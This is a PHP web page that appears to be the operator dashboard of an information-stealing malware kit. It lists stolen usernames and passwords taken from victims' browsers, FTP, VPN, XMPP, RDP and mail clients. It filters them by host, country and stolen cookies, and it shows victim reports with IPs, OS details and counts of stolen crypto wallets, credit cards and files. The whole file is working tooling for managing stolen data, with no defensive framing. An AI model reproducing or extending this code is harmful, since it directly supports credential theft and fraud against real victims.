<?php
/*
 * 0 - Browser
 * 1 - FTP
 * 2 - VPN
 * 3 - Jabber
 * 4 - RDP
 * 5 - Mail
 */
require_once('common.php');
require_once('global.php');

?>

<!DOCTYPE html>
<html>
<head>
	<link rel="shortcut icon" type="image/png" href="img/favicon.png" />
	<link rel="stylesheet" href="css/jquery.fancybox.min.css" />
	<script src="js/functions.js"></script>
	<script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>
	<script src="js/jquery.fancybox.min.js"></script>
</head>

<body>

	<?php $type="passwords"; require_once('nav_bar.php'); ?>

	<div class="modal-window" id="implinks-preview" style="display: none;">
		<p data-selectable="true" id="implinks_data"></p>
	</div>
	
	<div class="modal-window" id="extrainfo-preview" style="display: none;">
		<p data-selectable="true" id="extrainfo_data"></p>
	</div>

	<div class="modal-window" id="log-preview" style="display: none;">
		<h3>
			<i class="fas fa-file-archive" style="margin-right: 5px;"></i> archive.zip
		</h3>

		<table>
			<thead>
				<tr>
					<th>Filename</th>
					<th>Size</th>
				</tr>
			</thead>

			<tbody id="log_data"></tbody>
		</table>

		<button id="preview-download" class="modal-button">
			<i class="fas fa-download" style="margin-right: 5px;"></i> Download
		</button>
	</div>

	<div class="main-info">
		<form name="filterform">
			<table>
				<tbody>
					<tr>
						<td class="content-subheading">Report ID: </td>
						<td>
							<input class="edit" name="rep_id" />
						</td>
					</tr>
					<tr>
						<td class="content-subheading">Host: </td>
						<td>
							<input class="edit" name="host" />
						</td>
					</tr>
					<tr>
						<td class="content-subheading">Countries: </td>
						<td>
							<input class="edit" name="countries">
						</td>
					</tr>
					<tr>
						<td class="content-subheading">Include cookie: </td>
						<td>
							<input type="checkbox" class="content-checkbox" name="with_cookie" />
						</td>
					</tr>
					<tr>
						<td class="content-subheading">Browsers: </td>
						<td>
							<input type="checkbox" class="content-checkbox" name="with_browsers" />
						</td>
					</tr>
					<tr>
						<td class="content-subheading">FTP: </td>
						<td>
							<input type="checkbox" class="content-checkbox" name="with_ftp" />
						</td>
					</tr>
					<tr>
						<td class="content-subheading">VPN: </td>
						<td>
							<input type="checkbox" class="content-checkbox" name="with_vpn" />
						</td>
					</tr>
					<tr>
						<td class="content-subheading">XMPP: </td>
						<td>
							<input type="checkbox" class="content-checkbox" name="with_xmpp" />
						</td>
					</tr>
					<tr>
						<td class="content-subheading">RDP: </td>
						<td>
							<input type="checkbox" class="content-checkbox" name="with_rdp" />
						</td>
					</tr>
					<tr>
						<td class="content-subheading">Mail: </td>
						<td>
							<input type="checkbox" class="content-checkbox" name="with_mail" />
						</td>
					</tr>
				</tbody>
			</table>
			<button class="example_a" type="submit" style="margin-left: 5px; margin-top: 30px; margin-bottom: 40px;">
				<i class="fas fa-filter" style="margin-right: 5px;"></i> Filter
			</button>
		</form>

		<br />


        <?php
		$conn = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_NAME) or die();

		$query = 'SELECT passwords.host, soft_name, user, password, passwords.report_id FROM `passwords`';

		if (isset($_GET['with_cookie'])) $query .= ' JOIN cookies ON passwords.report_id = cookies.report_id ';
		if (isset($_GET['countries']) && !empty($_GET['countries'])) $query .= ' JOIN reports ON passwords.report_id = reports.rep_id ';
		$query .= ' WHERE 1=1 ';
		if (isset($_GET['host']) && !empty($_GET['host']))
		{
			$query .= sprintf(" AND LOCATE('%s', passwords.host) ", mysqli_real_escape_string($conn, $_GET['host']));
			if (isset($_GET['with_cookie']) && $_GET['with_cookie'] == 'on')
			{
				$query .= sprintf(" AND LOCATE('%s', cookies.host) ", mysqli_real_escape_string($conn, $_GET['host']));
			}
		}
		
		if (isset($_GET['countries']) && !empty($_GET['countries'])) $query .= " AND LOCATE(reports.country_code, '".mysqli_real_escape_string($conn, $_GET['countries'])."') ";

		$query .= ' AND soft_type IN (99, ';
		if (isset($_GET['with_browsers']) && $_GET['with_browsers'] == 'on') $query .= '0, ';
		if (isset($_GET['with_ftp']) && $_GET['with_ftp'] == 'on') $query .= '1, ';
		if (isset($_GET['with_vpn']) && $_GET['with_vpn'] == 'on') $query .= '2, ';
		if (isset($_GET['with_xmpp']) && $_GET['with_xmpp'] == 'on') $query .= '3, ';
		if (isset($_GET['with_rdp']) && $_GET['with_rdp'] == 'on') $query .= '4, ';
		if (isset($_GET['with_mail']) && $_GET['with_mail'] == 'on') $query .= '5, ';

        if (isset($_GET['rep_id']) && is_numeric($_GET['rep_id'])) $query .= '0, 1, 2, 3, 4, 5, ';
        $query = substr($query, 0, -2);
		$query .= ') ';
		
		if (isset($_GET['rep_id']) && is_numeric($_GET['rep_id']))
		{
			$query .= ' AND passwords.report_id='.$_GET['rep_id'];
			$repInfo = mysqlQuery('SELECT rep_id, guid, timestamp, checked, ip, country_code, country, os_name, pcname, username, admin, il, pwd_count, btc_count, cc_count, files_count, comment, zipname, favourite FROM `reports` WHERE rep_id='.$_GET['rep_id'])[0];
        ?>
		<table class="darkTable dtt">
			<thead>
				<tr>
					<th scope="col"></th>
					<th scope="col">ID</th>
					<th scope="col">GUID</th>
					<th scope="col">IP</th>
					<th scope="col">Country</th>
					<th scope="col">OS</th>
					<!-- <th scope="col">PC(User)</th>
                                        <th scope="col">Admin</th> -->
					<th scope="col">IL</th>
					<th scope="col">PWD | BTC | CC | Files</th>
					<th scope="col">Comment</th>
					<th scope="col">Checked</th>
					<th scope="col">Log Date</th>
					<th scope="col">Actions</th>
				</tr>
			</thead>

			<tbody id="main_items">
				<?php printBot($repInfo); ?>
			</tbody>
		</table>
		<?php
		}
		?>
		<table class="darkTable dtt dtt_second">
			<thead>
				<tr>
					<th>Soft Name</th>
					<th>URL</th>
					<th>Username</th>
					<th>Password</th>
					<th>Actions</th>
				</tr>
			</thead>

			<tbody id="main_items">
				<?php

				$results = mysqlQuery($query);

				for ($i = 0; $i < count($results); ++$i) {
					$rep_id = $results[$i]['report_id'];
					$host = substr($results[$i]['host'], 0, 80);
					echo "<tr>";
					echo "<td data-label='Soft name'>{$results[$i]['soft_name']}</td>";
					echo "<td data-label='Url' class='longtext_'><span>$host</span></td>";
					echo "<td data-label='Username'>{$results[$i]['user']}</td>";
					echo "<td data-label='Password' class='longtext_'><span>{$results[$i]['password']}</span></td>";
					echo sprintf("<td data-label='Actions'><a class='download-button' href='?rep_id=%d'>Show report: %d</a></td>",
							$rep_id, $rep_id);
					echo "</tr>";
				}
				mysqli_close($conn);
                ?>
			</tbody>
		</table>
	</div>

    <script type="text/javascript">
				if (location.search)
				{
					var data = location.search.substring(1).split('&');
					var pairs = {};
					for (var i = 0; i < data.length; ++i)
					{
						var parameter = data[i].split('=');
						pairs[parameter[0]] = parameter[1];
    				}
					var form = document.filterform;
					for (var i in pairs) if (form.elements[i])
					{
						form.elements[i].value = decodeURIParam(pairs[i]);
						if (form.elements[i].type == 'checkbox' && pairs[i] == 'on') form.elements[i].checked = true;
					}
				}
    </script>

</body>
</html>